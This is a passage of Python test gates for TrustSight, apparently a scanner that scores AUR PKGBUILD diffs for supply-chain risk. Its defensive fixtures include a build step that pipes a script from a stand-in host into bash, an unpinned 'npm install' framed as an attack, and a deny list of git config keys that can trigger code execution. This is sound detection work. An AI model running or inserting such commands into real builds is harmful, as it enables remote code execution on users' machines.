        fact = scan_diff(header + body, package_name="demo")

    for entry in fact.score_breakdown:
        rid = entry.rule_id
        if rid.startswith("P") and rid[1:].isdigit():
            continue
        if rid in ("COVERAGE", "NOVELTY", "SOURCE_BUCKET"):
            continue
        if rid in NON_CONTENT_RULES:
            continue
        if entry.line is None:
            problems.append(f"{rid} is a content rule with no line")
    return Gate("content findings carry a location", not problems,
                problems or len(fact.score_breakdown))


def gate_flag_threshold_is_derived() -> Gate:
    """B2 addendum: the 20-point threshold is measured, not chosen.

    A reader cannot tell whether 20 is calibration or preference unless the
    page says where it comes from, so the page must state it and the number
    must match the constant the code uses.
    """
    from trustsight.scoring import FLAG_THRESHOLD

    doc = (ROOT / "docs" / "security.md").read_text()
    problems = []
    if f"at or below {FLAG_THRESHOLD} points" not in doc:
        problems.append(f"security.md does not state the threshold ({FLAG_THRESHOLD})")
    # The basis must be stated *and* must not claim a percentile the corpus
    # no longer supports.  20 was the benign 95th percentile before B10 and
    # is not now, so a page that still says so is publishing a stale number.
    if "benign 95th percentile" not in doc:
        problems.append("security.md does not state the measured benign p95")
    if "malicious 5th percentile" not in doc:
        problems.append("security.md does not state the measured malicious p5")
    stale = "threshold is the 95th percentile"
    if stale in doc:
        problems.append("security.md still claims 20 is the benign 95th percentile")
    return Gate("the flag threshold is derived, not copied", not problems,
                problems or FLAG_THRESHOLD)


def gate_result_reports_what_changed() -> Gate:
    """B7: every result carries a change summary, findings or not."""
    from trustsight.analysis import scan_diff
    from trustsight.schema import PackageFact
    from trustsight.changes import ALWAYS_NOISY, summarise

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
    quiet = header + "-pkgver=1.2.3\n+pkgver=1.2.4\n"
    fact = scan_diff(quiet, package_name="demo")

    problems = []
    if not fact.changes:
        problems.append("a result with no findings reported no changes either")
    if not any("1.2.4" in c for c in fact.changes):
        problems.append("the version move was not reported")
    # Always-noisy files must not be listed.
    noisy = PackageFact()
    noisy.diff_summary.file_changes = [{"path": p, "status": "modified"}
                                       for p in ALWAYS_NOISY]
    if any(p in " ".join(summarise(noisy)) for p in ALWAYS_NOISY):
        problems.append("a always-noisy file was listed")
    return Gate("a result reports what changed", not problems,
                problems or fact.changes)


def gate_change_entries_carry_no_severity() -> Gate:
    """B7: changes are context, not findings.

    They must never acquire a severity, a weight, or a place in
    ``triggered_rules``; conflating the two would corrupt the calibration
    and the reader's sense of what a finding means.
    """
    from trustsight.analysis import scan_diff

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
    fact = scan_diff(header + "-pkgver=1\n+pkgver=2\n+source=(\"https://x.invalid/a\")\n",
                     package_name="demo")
    problems = []
    if not all(isinstance(c, str) for c in fact.changes):
        problems.append("a change entry is not a plain string")
    fired = {e.rule_id for e in fact.score_breakdown}
    if any(c in fired for c in fact.changes):
        problems.append("a change entry reached the score breakdown")
    return Gate("change entries carry no severity", not problems,
                problems or len(fact.changes))


def gate_positive_evidence_never_scores() -> Gate:
    """B10: declared practice is reported, never credited."""
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import calculate_score

    maximal = dict(
        verification_evidence=["checksum_present", "validpgpkeys_declared",
                               "gpg_verify_present"],
        pinning_level="checksum_pinned",
    )
    buckets = {"https://github.com/a/b.tar.gz": "trusted_forge"}
    triggered = [{"rule_id": "R001", "severity": "HIGH", "name": "x", "match": ""}]

    bare, _, _ = calculate_score(triggered, {}, NoveltyContext())
    rich, breakdown, _ = calculate_score(triggered, buckets, NoveltyContext(), **maximal)

    problems = []
    if rich != bare:
        problems.append(f"declared evidence moved the score: {bare} -> {rich}")
    positives = [e for e in breakdown
                 if e.rule_id.startswith("P") and e.rule_id[1:].isdigit()]
    if not positives:
        problems.append("no declared-practice finding was emitted")
    for entry in positives:
        if entry.weight != 0 or entry.severity != "INFO":
            problems.append(f"{entry.rule_id} is {entry.severity} weight {entry.weight}")
    return Gate("positive evidence never changes the score", not problems,
                problems or sorted(e.rule_id for e in positives))


def gate_declared_findings_fire_under_shipped_config() -> Gate:
    """Every declared-practice finding is reachable with the config that ships.

    P007 was emitted from inside an ``if modifier < 0`` branch.  When B10
    set ``trusted_forge = 0`` the branch became unreachable, so the finding
    stopped existing in production while still firing in the test suite,
    whose fixture config still carried the old ``-10``.  Seven documentation
    pages described a finding that could not occur.

    This is the entry-point failure from
    [reviewing a security control](../docs/contributing/security-review.md)
    wearing a different hat: the check pointed at a configuration the tool
    does not use.  So the reachability check runs against the shipped
    config, in a temp dir, with a cold database, and uses one recipe per
    practice rather than one recipe for all of them: a single PKGBUILD
    cannot be both commit-pinned and tag-pinned, and mixing checksummed and
    SKIP sources suppresses the checksum evidence entirely.
    """
    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.config import load_config, load_rules
    from trustsight.scoring import DECLARED_REASONS

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
    digest = "3b1f8a2c9d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8"
    recipes = {
        # A checksummed tarball is both "checksums declared" and, because
        # the digest pins the artifact, "pinned by checksum".
        "P001": header + f'+source=("https://ex.invalid/d-1.tar.gz")\n+sha256sums=(\'{digest}\')\n',
        "P005": header + f'+source=("https://ex.invalid/d-1.tar.gz")\n+sha256sums=(\'{digest}\')\n',
        "P002": header + '+validpgpkeys=(\'ABCDEF0123456789ABCDEF0123456789ABCDEF01\')\n',
        "P003": header + '+  gpg --verify d.tar.gz.asc\n',
        # A versioned path with no digest: pinned to a tag, which is the
        # weaker form, since a tag can be repointed.
        "P006": header + '+source=("https://ex.invalid/d/archive/v1.2.3.tar.gz")\n+sha256sums=(\'SKIP\')\n',
        "P007": header + '+source=("https://github.com/d/d/archive/v1.tar.gz")\n',
        # A branch ref: makepkg resolves it when the package is built, so
        # what this compiles is whatever upstream has published by then.
        "P008": header + '+source=("git+https://ex.invalid/d.git#branch=main")\n',
    }

    problems = []
    fired: dict[str, bool] = {}
    with shipped_config():
        config, rules = load_config(), load_rules()
        for expected, diff in recipes.items():
            fact = scan_diff(diff, rules=rules, config=config, package_name="demo")
            seen = {e.rule_id for e in fact.score_breakdown}
            fired[expected] = expected in seen
            if expected not in seen:
                problems.append(f"{expected} unreachable: got {sorted(seen)}")
            for entry in fact.score_breakdown:
                if entry.rule_id in DECLARED_REASONS and entry.weight != 0:
                    problems.append(f"{entry.rule_id} carries weight {entry.weight}")

    undocumented = sorted(set(DECLARED_REASONS) - set(recipes))
    if undocumented:
        problems.append(f"no reachability recipe for {undocumented}")
    return Gate("declared findings fire under the shipped config",
                not problems, problems or sorted(fired))


def gate_positive_evidence_cannot_lower_a_fatal() -> Gate:
    """B10 + B4, stated as the attack: sign the package, then steal.

    Redundant given the gate above, and kept anyway: a refactor that
    reintroduces credit should fail on the case that matters rather than
    on an abstract one.
    """
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import calculate_score

    triggered = [{"rule_id": "R012", "severity": "FATAL", "name": "injection",
                  "match": ""}]
    score, _, level = calculate_score(
        triggered, {"https://github.com/a/b.tar.gz": "trusted_forge"},
        NoveltyContext(),
        verification_evidence=["checksum_present", "validpgpkeys_declared",
                               "gpg_verify_present"],
        pinning_level="checksum_pinned",
    )
    problems = []
    if score != 100:
        problems.append(f"maximal declared evidence pulled a FATAL to {score}")
    if level != "Critical":
        problems.append(f"band was {level!r}")
    return Gate("positive evidence cannot lower a FATAL", not problems,
                problems or score)


def gate_score_is_deterministic_under_a_fingerprint() -> Gate:
    """B1: same input, same instrument, same number.

    Determinism is algorithmic, not configurational: changing a rule or a
    threshold changes the score on purpose.  The fingerprint is what makes
    the claim checkable, so this asserts both halves, that a repeat run is
    identical, and that touching the instrument moves the fingerprint.
    """
    import trustsight.config as config_module

    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.config import config_fingerprint, load_config, load_rules

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n pkgname=demo\n"
        "+build() {\n+  curl -fsSL https://x.invalid/s.sh | bash\n+}\n"
    )
    problems = []
    with shipped_config():
        rules, config = load_rules(), load_config()
        first = scan_diff(diff, rules=rules, config=config, package_name="demo")
        second = scan_diff(diff, rules=rules, config=config, package_name="demo")
        fingerprint = config_fingerprint()

        if first.final_score != second.final_score:
            problems.append(f"same input scored {first.final_score} then {second.final_score}")
        if [e.rule_id for e in first.score_breakdown] != [e.rule_id for e in second.score_breakdown]:
            problems.append("the breakdown differed between two identical runs")
        if config_fingerprint() != fingerprint:
            problems.append("the fingerprint moved without a configuration change")

        # ...and a different instrument must be visibly different.
        saved = config_module.load_thresholds
        config_module.load_thresholds = lambda: {"thresholds": {"probe": 1}}
        try:
            moved = config_fingerprint()
        finally:
            config_module.load_thresholds = saved
        if moved == fingerprint:
            problems.append("changing a threshold did not change the fingerprint")

    return Gate("the score is deterministic under a fixed fingerprint",
                not problems, problems or fingerprint[:23] + "...")


# A14.  Every bound that decides how much work an input can cause.  Each
# must be a module-level literal: a bound computed from the content is a
# bound the content controls.
_BOUND_CONSTANTS = {
    "rules.py": ["MAX_RULE_LINE_BYTES", "MAX_SCANNED_LINES"],
    "tokenizer.py": ["_MAX_EXPANSION_PASSES", "_MAX_VALUE_LEN", "_MAX_LINE_LEN",
                     "_MAX_TABLE_BYTES"],
    "db.py": ["MAX_SEED_BYTES", "MAX_SEED_MEMBER_BYTES"],
    "differ.py": ["MAX_GENERATED_DIFF_BYTES", "MAX_DIFF_PATCHES",
                  "MAX_DIFF_SUMMARY_FILES", "MAX_PATCH_BYTES", "MAX_PATCH_SOURCE_BYTES",
                  "MAX_PKG_BUILD_BYTES", "MAX_COMPANION_TREE_ENTRIES",
                  "MAX_COMPANION_NAME_BYTES", "MAX_COMPANION_BYTES",
                  "MAX_COMPANION_FILES", "MAX_DIFF_PATH_BYTES"],
    "full_aur/fetch.py": ["MAX_RESPONSE_BYTES", "MAX_TAR_MEMBERS",
                          "MAX_TAR_MEMBER_BYTES", "_HTTP_TIMEOUT"],
    "full_aur/metadata.py": ["MAX_DECOMPRESSED_BYTES", "MAX_RESPONSE_BYTES",
                             "HTTP_TIMEOUT"],
    "full_aur/export.py": ["MAX_ARTIFACT_BYTES"],
    "ioc_baseline.py": ["MAX_BASELINE_BYTES", "MAX_BASELINE_ENTRIES"],
    "seed_build.py": ["MAX_PROVENANCE_BYTES", "MAX_RAW_MAINTAINERS_BYTES"],
    "bounded_io.py": ["_CHUNK_BYTES"],
    "buckets.py": ["MAX_HOST_BYTES", "MAX_HOST_LABELS"],
    "srcinfo.py": ["MAX_SRCINFO_BYTES", "MAX_SRCINFO_LINES",
                   "MAX_SRCINFO_VALUES_PER_KEY"],
    "depth.py": ["MAX_DEPTH_LEVELS", "MAX_DEPTH_NODES"],
    "fetcher.py": ["MAX_TRANSFER_BYTES", "MAX_TOTAL_TRANSFER_BYTES",
                   "MAX_HISTORY_COMMITS"],
}


def gate_every_input_bound_is_a_source_constant() -> Gate:
    """A14: no package-controlled input decides how much this process uses.

    A4 bounds what arrives, A5 what is matched, A6 what is expanded.  The
    conjunction only holds if the bounds themselves are constants: a limit
    derived from the analysed text is a limit the attacker sets.
    """
    problems = []
    found = 0
    for rel, names in _BOUND_CONSTANTS.items():
        path = SRC / rel
        if not path.exists():
            problems.append(f"{rel} is missing")
            continue
        tree = ast.parse(path.read_text())
        assigned = {}
        for node in tree.body:  # module level only
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        assigned[target.id] = node.value
        for name in names:
            value = assigned.get(name)
            if value is None:
                problems.append(f"{rel}: {name} is not a module-level assignment")
                continue
            found += 1
            # A literal, or an arithmetic tree of literals (1024 * 1024).
            for sub in ast.walk(value):
                if isinstance(sub, (ast.Name, ast.Call, ast.Attribute, ast.Subscript)):
                    problems.append(f"{rel}: {name} is computed, not a literal")
                    break
    return Gate("every input bound is a source constant", not problems,
                problems or found)


def gate_every_render_ends_with_a_direction() -> Gate:
    """B9, structurally: something must be there, rather than something absent.

    A denylist over phrasings is a treadmill; a wording nobody anticipated
    slips past it.  Requiring a direction to review cannot be bypassed by
    creative rewording, because the check fails when the direction is
    missing however the rest of the sentence reads.
    """
    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry
    from trustsight.verdict import DIRECTIONS, fallback_verdict

    cases = {
        "first analysis, no versions": PackageFact(first_seen=True),
        "first analysis": PackageFact(first_seen=True, old_version="1", new_version="2"),
        "nothing fired": PackageFact(diff_summary=DiffSummary(files_changed=["PKGBUILD"])),
        "signals fired": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25,
                                        reason="x")]),
        "fatal": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL", weight=0,
                                        reason="x")]),
    }
    problems = []
    for label, fact in cases.items():
        verdict = fallback_verdict(fact).rstrip()
        if not verdict.endswith(DIRECTIONS):
            problems.append(f"{label}: ends {verdict[-48:]!r}")
    return Gate("every result render ends with a direction to review",
                not problems, problems or sorted(cases))


def gate_no_git_filters_or_hooks() -> Gate:
    """A3: cloning executes nothing.

    libgit2 does not run git hooks on clone, and this project configures no
    ``clean``, ``smudge`` or ``fsmonitor`` filter, which are the
    git-config-driven paths where a fetch can otherwise become an
    execution.  This documents a property the library has rather than a
    control this project adds.
    """
    dangerous = ("core.fsmonitor", "filter.", "core.hooksPath", "core.hookspath",
                 "uploadpack.packObjectsHook", "diff.external", "core.pager")
    hits = []
    for path in _python_files():
        text = path.read_text()
        for lineno, line in enumerate(text.splitlines(), start=1):
            for key in dangerous:
                if key in line and not line.lstrip().startswith("#"):
                    hits.append(f"{_rel(path)}:{lineno} {key}")
        tree = ast.parse(text)
        for node in ast.walk(tree):
            # A write to a *git* config, which is `repo.config[...] = ...`
            # or a set_multivar on it.  TrustSight's own `set_config`, which
            # writes config.toml, is not this and must not be flagged.
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if (isinstance(target, ast.Subscript)
                            and isinstance(target.value, ast.Attribute)
                            and target.value.attr == "config"):
                        hits.append(f"{_rel(path)}:{node.lineno} writes git config")
            if isinstance(node, ast.Call) and _call_name(node).endswith(
                    ("config.set_multivar", "config.add_file")):
                hits.append(f"{_rel(path)}:{node.lineno} writes git config")
    return Gate("no git filters or hooks are configured", not hits, hits)


def gate_doc_cross_references_resolve() -> Gate:
    """Every link between the docs points at a file and anchor that exist.

    This is the documentation-level form of the failure B2 exists to
    prevent: renaming a heading leaves every sentence on the page true,
    and quietly breaks the links that connect one claim to another, with
    nothing failing anywhere.  It nearly happened to this model when B2's
    own heading was reworded, and heading rewording is *likely* on a page
    people keep polishing.  Eight files reference each other, so the
    check covers all of ``docs/``, not just ``security.md``.
    """
    docs = ROOT / "docs"
    if not docs.exists():
        return Gate("doc cross-references resolve", False, "docs/ is missing")

    anchors: dict[Path, set[str]] = {}
    for path in docs.rglob("*.md"):
        found = set()
        fenced = False
        for line in path.read_text().splitlines():
            if line.lstrip().startswith("```"):
                fenced = not fenced
            elif not fenced and line.startswith("#"):
                found.add(_anchor(line))
        anchors[path.resolve()] = found

    broken: list[str] = []
    for path in sorted(docs.rglob("*.md")):
        fenced = False
        for lineno, line in enumerate(path.read_text().splitlines(), start=1):
            if line.lstrip().startswith("```"):
                fenced = not fenced
                continue
            if fenced:
                continue
            # Inline code is not markup.  A rule pattern such as
            # `(?<![^\x00-\x7F])[...]` contains `](...)` and reads as a
            # link to a regex fragment otherwise.
            for target in _MD_LINK_RE.findall(_INLINE_CODE_RE.sub("`code`", line)):
                if target.startswith(("http://", "https://", "mailto:")):
                    continue
                file_part, _, anchor = target.partition("#")
                if file_part:
                    dest = (path.parent / file_part).resolve()
                    if not dest.exists():
                        broken.append(f"{_rel(path)}:{lineno} -> {target} (no such file)")
                        continue
                else:
                    dest = path.resolve()
                if anchor and anchor not in anchors.get(dest, set()):
                    broken.append(f"{_rel(path)}:{lineno} -> {target} (no such anchor)")

    checked = sum(len(v) for v in anchors.values())
    return Gate("doc cross-references resolve", not broken,
                broken or f"{checked} anchors across {len(anchors)} files")


def gate_doc_lists_every_gate(gates: list[Gate]) -> Gate:
    """``docs/security.md`` names exactly the invariants enforced here.

    The document is the claim and this script is the proof, so a gate with
    no entry is an unstated guarantee and an entry with no gate is an
    unbacked promise.  Both are failures.
    """
    name = "docs/security.md matches the gates"
    doc = ROOT / "docs" / "security.md"
    if not doc.exists():
        return Gate(name, False, "missing")
    text = doc.read_text()
    # Only the enforcement map, not every backticked first column on the
    # page: the coverage-gap table upstream has the same row shape.
    section = text.split("## Part C")[-1].split("\n## ")[0]
    documented = set(re.findall(r"^\|\s*`([^`]+)`\s*\|", section, re.MULTILINE))
    enforced = {g.name for g in gates} | {name}
    missing = sorted(enforced - documented)
    extra = sorted(documented - enforced)
    problems = []
    if missing:
        problems.append(f"enforced but undocumented: {missing}")
    if extra:
        problems.append(f"documented but unenforced: {extra}")
    return Gate(name, not problems, problems)


def _parity_fact():
    """One fact with every reportable feature on it, for the parity gates."""
    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry

    return PackageFact(
        package_name="parity",
        old_version="1.0",
        new_version="1.1",
        diff_summary=DiffSummary(
            files_changed=["PKGBUILD"],
            file_changes=[{"path": "PKGBUILD", "status": "modified"}],
        ),
        score_breakdown=[
            ScoreEntry(rule_id="R001", severity="CRITICAL", weight=40,
                       reason="curl piped to bash", file="PKGBUILD", line=4),
        ],
        final_score=40,
        risk="Critical",
        coverage_gaps=["line_truncated"],
        changes=["PKGBUILD modified"],
        suppressed_rules=[{"rule_id": "R099", "severity": "LOW"}],
    )


def gate_api_and_cli_emit_the_same_body() -> Gate:
    """The API's JSON is the CLI's JSON: same keys, same values.

    Three surfaces used to build three bodies - ``review --json``,
    ``inspect --json`` and ``Report.to_dict()`` - with two naming
    conventions between them, and the API body carried no ``findings`` at
    all while its docstring claimed to be what the CLI writes. A consumer
    could be written against one path and silently miss evidence on
    another.

    Exercised through the surfaces a caller actually reaches, not through
    ``report_body`` directly: calling the shared helper twice would prove
    only that it equals itself, which is exactly the narrow-call mistake
    ``contributing/security-review.md`` catalogues.
    """
    from trustsight.api import _report_from_fact
    from trustsight.reporting import REPORT_KEYS, evaluate_fact, report_body

    fact = _parity_fact()
    evaluated = evaluate_fact(fact)
    problems = []

    cli = report_body(evaluated)
    api = _report_from_fact(fact).to_dict()
    if set(cli) != set(api):
        problems.append(
            f"key sets differ: cli-only={sorted(set(cli) - set(api))} "
            f"api-only={sorted(set(api) - set(cli))}"
        )
    for key in sorted(set(cli) & set(api)):
        if cli[key] != api[key]:
            problems.append(f"{key}: cli={cli[key]!r} api={api[key]!r}")

    missing = sorted(set(REPORT_KEYS) - set(api))
    if missing:
        problems.append(f"REPORT_KEYS absent from the body: {missing}")

    # Never skipping info: the evidence a run produced must reach the body.
    if evaluated["findings"] and not api.get("findings"):
        problems.append("findings were produced but the body carries none")

    for flags in ({"include_score": True}, {"verbose": True},
                  {"include_score": True, "verbose": True}):
        if report_body(evaluated, **flags) != _report_from_fact(fact).to_dict(**flags):
            problems.append(f"bodies differ under {flags}")

    return Gate("the API and CLI emit the same JSON body", not problems,
                problems or sorted(api))


def gate_score_is_withheld_by_default() -> Gate:
    """The aggregate numbers are available on request, never volunteered.

    The terminal guarantee ("the default output is not headline-shaped")
    only holds for a machine consumer if the JSON bodies obey it too, and
    ``inspect --json`` used to volunteer ``score``, ``risk`` and
    ``risk_label`` on every call regardless of the flags - so the number the
    CLI is documented to withhold was one flag away from being the default
    for every consumer.

    Attribute access is deliberately not covered: ``report.score`` is the
    caller naming the field, which is the request.
    """
    from trustsight.api import _report_from_fact
    from trustsight.reporting import SCORE_KEYS, VERBOSE_KEYS, evaluate_fact, report_body

    fact = _parity_fact()
    evaluated = evaluate_fact(fact)
    problems = []

    surfaces = {
        "cli": (report_body(evaluated),
                report_body(evaluated, include_score=True),
                report_body(evaluated, verbose=True)),
        "api": (_report_from_fact(fact).to_dict(),
                _report_from_fact(fact).to_dict(include_score=True),
                _report_from_fact(fact).to_dict(verbose=True)),
    }
    for name, (default, scored, verbose) in surfaces.items():
        for key in SCORE_KEYS:
            if key in default:
                problems.append(f"{name}: {key} present by default")
            if key not in scored:
                problems.append(f"{name}: {key} missing when requested")
        for key in VERBOSE_KEYS:
            if key in default:
                problems.append(f"{name}: {key} present by default")
            if key not in verbose:
                problems.append(f"{name}: {key} missing under verbose")
        # A weight is score arithmetic and travels with the breakdown.
        for finding in default.get("findings", ()):
            if "weight" in finding:
                problems.append(f"{name}: a default finding carries a weight")
                break

    # The evidence keys are the other half: withholding the score must not
    # withhold anything else.
    for name, (default, _s, _v) in surfaces.items():
        for key in ("findings", "coverage_gaps", "suppressed_rules", "verdict"):
            if key not in default:
                problems.append(f"{name}: {key} missing from the default body")

    return Gate("the score is withheld from every default body", not problems,
                problems or list(SCORE_KEYS))


# Analysis entry points the CLI uses.  The API must reach the package
# through these and define no pipeline of its own, or "same mechanisms,
# different output form" stops being true.
_SHARED_ANALYSIS = {
    "analyze_outdated_batch", "discover_packages",     # review
    "analyze_package",                                 # inspect
    "analyze_package_text",                            # text / corpus
    "evaluate_fact", "evaluate_review_row", "report_body",
}


def gate_api_and_cli_share_the_analysis() -> Gate:
    """The API and CLI differ in output form, not in what they compute.

    Structural: the API must import its analysis from the same modules the
    CLI does. A second implementation would be free to drift - different
    rules, a different score, a different notion of coverage - while every
    behavioural parity check kept passing on the surface it happened to
    exercise.
    """
    api = SRC / "api.py"
    tree = ast.parse(api.read_text())
    imported: set[str] = set()
    modules: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module:
            modules.add(node.module)
            for alias in node.names:
                imported.add(alias.name)

    problems = []
    reached = sorted(_SHARED_ANALYSIS & imported)
    if not reached:
        problems.append("api.py imports none of the shared analysis entry points")
    # The scoring model in particular must not be re-derived here.
    for banned in ("calculate_score", "apply_rules", "risk_level"):
        if banned in imported:
            problems.append(f"api.py imports {banned}: scoring belongs to the engine")
    # A rule engine or differ reached directly would be a parallel pipeline.
    for module in sorted(modules):
        if module.endswith(("rules", "differ", "tokenizer")):
            problems.append(f"api.py imports {module} directly")

    return Gate("the API and CLI share one analysis", not problems,
                problems or reached)


def gate_unpinned_build_deps_is_a_declared_gap() -> Gate:
    """B2/A14: a build the analysis could not read is a declared gap.

    ``makepkg`` verifies ``source=()`` against ``sha256sums`` and verifies
    nothing a build step resolves from a registry, so the code that will
    execute is not in the analysed text.  The June 2026 AUR campaign is that
    situation exactly, and it scored 15/100 - UNFLAGGED - against a database
    with a normal corpus before this gap existed.

    Deliberately not a scored rule: ``npm install`` in a build function is
    ordinary AUR practice, which is why H035 is scoped to install hooks and
    why a calibration gate keeps it there.  The gap claims nothing about the
    package; it records that a sensor was missing, and B2 then forbids the
    run from reading as clean.
    """
    from trustsight.analysis.buildfetch import has_unpinned_build_deps
    from trustsight.coverage import UNPINNED_BUILD_DEPS, fail_closed, gaps_from

    attack = (
        "diff --git a/PKGBUILD b/PKGBUILD\n"
        " prepare() {\n"
        "+  npm install atomic-lockfile\n"
        " }\n"
    )
    quiet = (
        "diff --git a/PKGBUILD b/PKGBUILD\n"
        "+# npm install atomic-lockfile\n"
        '+echo "npm install atomic-lockfile"\n'
    )
    offline = (
        "diff --git a/PKGBUILD b/PKGBUILD\n"
        " build() {\n"
        "+  cargo build --offline\n"
        " }\n"
    )

    problems = []
    if not has_unpinned_build_deps(attack):
        problems.append("a build-time registry resolution did not record the gap")
    if has_unpinned_build_deps(quiet):
        problems.append("a name in a comment or string recorded the gap")
    if has_unpinned_build_deps(offline):
        problems.append("an explicitly offline build recorded the gap")

    gaps = gaps_from(tree_analyzed=True, unpinned_build_deps=True)
    if UNPINNED_BUILD_DEPS not in gaps:
        problems.append("gaps_from does not carry the gap")
    if fail_closed("Low", gaps, []) != "Inconclusive":
        problems.append("the gap does not forbid an unflagged verdict")

    return Gate("an unpinned build dependency is a declared gap", not problems,
                problems or UNPINNED_BUILD_DEPS)


def gate_every_render_reports_the_same_information() -> Gate:
    """B11 on the terminal: a render may not drop what the JSON carries.

    The body gates above compare JSON with JSON.  A reviewer reads whichever
    render their terminal gave them, so a field present in one and absent
    from another is a difference in *information* between two surfaces, and
    B2, B5 and B7 each say the field in question may never be dropped.

    All four renderers, looped rather than sampled, because every one of the
    three properties was in fact false on some surface: `inspect` showed
    nothing about a coverage gap unless a band was requested, `review`
    showed suppressions only in its JSON body, and `inspect --plain` had no
    change summary at all. Each had a gate already, and each gate was aimed
    at the data layer where the value is set rather than at the renders that
    have to show it.
    """
    import contextlib

    from rich.console import Console

    import trustsight.cli.display as display
    import trustsight.cli.inspect as inspect_cli
    import trustsight.cli.review as review_cli
    from trustsight.coverage import GAP_REASONS
    from trustsight.depth import DependencyReport
    from trustsight.reporting import evaluate_fact
    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry

    gap = "diff_truncated"
    change = "PKGBUILD moved"
    suppressed = "R099"
    dependency = "render-parity-dep"
    fact = PackageFact(
        package_name="render-parity", old_version="1.0", new_version="1.1",
        diff_summary=DiffSummary(1, 0, ["PKGBUILD"],
                                 [{"path": "PKGBUILD", "status": "modified"}]),
        score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25,
                                    reason="curlpipe", file="PKGBUILD", line=4)],
        final_score=25, risk="Medium", coverage_gaps=[gap], changes=[change],
        suppressed_rules=[{"rule_id": suppressed, "severity": "LOW",
                           "override_reason": "known"}],
        dependencies=[DependencyReport(name=dependency, depth=1, score=40,
                                       risk="High", risk_label="High",
                                       finding_count=1)],
    )
    row = dict(evaluate_fact(fact))
    row["failed"] = False

    def rich(fn) -> str:
        buffer = io.StringIO()
        saved = display._console
        display._console = Console(file=buffer, force_terminal=False, width=240)
        try:
            fn()
        finally:
            display._console = saved
        return buffer.getvalue()

    def plain(fn) -> str:
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            fn()
        return buffer.getvalue()

    renders = {
        "review rich": rich(lambda: review_cli._render_results_rich(
            [row], 1, False, False, False, False)),
        "review plain": plain(lambda: review_cli._render_results_plain(
            [row], 1, False, False, False, False)),
        "inspect rich": rich(lambda: inspect_cli._inspect_rich(fact)),
        "inspect plain": plain(lambda: inspect_cli._inspect_plain(fact)),
    }

    required = {
        "the coverage gap (B2)": (GAP_REASONS[gap], gap),
        "the suppressed rule (B5)": (suppressed,),
        "the change summary (B7)": (change,),
        # A dependency is a full analysis with its own band, so a surface
        # that hides it is hiding a result and not a detail.
        "the analysed dependency (depth)": (dependency,),
    }
    problems = []
    for name, out in renders.items():
        for what, tokens in required.items():
            if not any(token in out for token in tokens):
                problems.append(f"{name} does not report {what}")

    return Gate("every render reports the same information", not problems,
                problems or sorted(renders))


def gate_generated_diff_is_bounded_before_assembly() -> Gate:
    """A4: the diff generator bounds what it allocates, not what it keeps.

    ``patch.text`` materialises a whole patch, and the git path used to call
    ``generate_diff`` with no ``max_bytes`` at all - so every filtered patch
    was read in full and joined before the pipeline's cap applied, and
    ``MAX_GENERATED_DIFF_BYTES`` was inert on the path that matters.

    The second half is the one that hides things. A patch the generator
    declines to retain leaves the assembled text at or under the cap, so a
    caller that re-derives truncation by measuring that text reports
    "complete" while content was skipped - the silent skip B2 forbids. The
    flag therefore travels out of the generator rather than being inferred,
    and this checks that it does.
    """
    import inspect

    from trustsight import differ
    from trustsight.analysis import pipeline

    problems = []

    # The bounded form must return the flag.
    signature = inspect.signature(differ.generate_diff_bounded)
    source = inspect.getsource(differ.generate_diff_bounded)
    if "-> tuple[str, DiffSummary, bool]" not in str(signature.return_annotation) + source:
        problems.append("generate_diff_bounded does not declare a truncation flag")
    for name in ("MAX_DIFF_PATCHES", "MAX_PATCH_BYTES", "MAX_DIFF_SUMMARY_FILES"):
        if name not in source:
            problems.append(f"{name} is not enforced in generate_diff_bounded")

    # The bound that matters runs *before* `patch.text`, because that
    # attribute has already allocated the whole patch by the time it
    # returns. Asserted behaviourally: a delta whose text raises if touched
    # must still produce a result and a truncation flag.
    if "MAX_PATCH_SOURCE_BYTES" not in source:
        problems.append("delta size is not checked before patch.text")

    touched = []

    class _Side:
        def __init__(self, size):
            self.path, self.size = "PKGBUILD", size

    class _Delta:
        status = 1

        def __init__(self, size):
            self.old_file = _Side(size)
            self.new_file = _Side(size)

    class _Exploding:
        def __init__(self, size):
            self.delta = _Delta(size)

        @property
        def text(self):
            touched.append(True)
            raise AssertionError("patch text read before the size check")

    huge = differ.MAX_PATCH_SOURCE_BYTES * 4

    class _Diff:
        deltas = [_Delta(huge)]
        stats = type("S", (), {"insertions": 0, "deletions": 0})()

        def __iter__(self):
            return iter([_Exploding(huge)])

    class _Repo:
        def get(self, _oid):
            return type("C", (), {"tree": object()})()

        def diff(self, *_a, **_k):
            return _Diff()

    try:
        _text, _summary, flag = differ.generate_diff_bounded(_Repo(), "a", "b")
    except AssertionError:
        problems.append("an oversized delta had its text requested")
    else:
        if touched:
            problems.append("an oversized delta had its text requested")
        if flag is not True:
            problems.append("skipping an oversized delta set no truncation flag")

    # The pipeline must consume the flag rather than re-deriving truncation.
    git_path = inspect.getsource(pipeline.analyze_package)
    if "generate_diff_bounded" not in git_path:
        problems.append("the git path does not use the bounded generator")
    if "generated_truncated" not in git_path:
        problems.append("the git path drops the generator's truncation flag")

